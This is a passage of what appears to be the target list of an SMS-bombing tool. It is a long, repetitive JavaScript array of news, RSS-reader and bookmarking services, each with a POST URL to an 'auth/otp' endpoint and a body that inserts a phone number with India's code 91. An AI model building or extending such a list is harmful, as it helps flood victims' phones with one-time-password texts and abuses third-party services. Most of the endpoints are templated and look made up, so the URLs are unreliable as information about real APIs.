        'name': 'Flipboard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.flipboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SmartNews_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.smartnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.google.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Apple_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.apple.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yahoo_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.yahoo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MSN_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.msn.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AOL_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.aol.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reddit_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.reddit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Twitter_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.twitter.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Facebook_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.facebook.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LinkedIn_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.linkedin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pocket_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.pocket.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Instapaper_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.instapaper.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Readwise_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.readwise.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Matter_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.matter.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Feedly_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.feedly.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Inoreader_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.inoreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NewsBlur_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.newsblur.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TheOldReader_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.theoldreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NetNewsWire_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.netnewswire.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reeder_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.reeder.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fiery_Feeds_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.fieryfeeds.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Unread_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.unread.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lire_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.lire.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ReadKit_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.readkit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vienna_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.vienna.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSOwl_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rssowl.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'QuiteRSS_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.quiterss.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Liferea_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.liferea.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FeedReader_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.feedreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSBandit_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rssbandit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSGuard_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rssguard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FluentReader_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.fluentreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GoodLinks_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.goodlinks.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Curtail_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.curtail.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wallabag_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.wallabag.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Shiori_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.shiori.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LinkAce_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.linkace.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Raindrop_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.raindrop.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BookmarkOS_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bookmarkos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StartMe_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.startme.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Papaly_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.papaly.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Booky_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.booky.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Diigo_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.diigo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Delicious_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.delicious.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pinboard_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.pinboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ScoopIt_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.scoopit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Paperli_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.paperli.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Flipboard_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.flipboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SmartNews_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.smartnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.googleapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Apple_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.appleapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yahoo_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.yahooapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MSN_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.msnapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AOL_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.aolapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reddit_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.redditapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Twitter_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.twitterapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Facebook_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.facebookapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LinkedIn_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.linkedinapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pocket_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.pocketapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Instapaper_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.instapaperapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Readwise_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.readwiseapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Matter_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.matterapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Feedly_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.feedlyapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Inoreader_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.inoreaderapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NewsBlur_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.newsblurapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TheOldReader_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.theoldreaderapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NetNewsWire_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.netnewswireapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reeder_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.reederapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fiery_Feeds_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.fieryfeedsapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Unread_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.unreadapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lire_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.lireapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ReadKit_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.readkitapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vienna_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.viennaapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSOwl_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rssowlapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'QuiteRSS_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.quiterssapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Liferea_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.lifereaapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FeedReader_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.feedreaderapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSBandit_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rssbanditapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSGuard_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rssguardapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FluentReader_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.fluentreaderapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GoodLinks_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.goodlinksapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Curtail_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.curtailapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wallabag_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.wallabagapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Shiori_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.shioriapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LinkAce_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.linkaceapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Raindrop_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.raindropapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BookmarkOS_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bookmarkosapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StartMe_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.startmeapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Papaly_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.papalyapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Booky_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bookyapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Diigo_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.diigoapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Delicious_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.deliciousapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pinboard_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.pinboardapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ScoopIt_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.scoopitapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Paperli_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.paperliapp.com/v1/auth/otp',
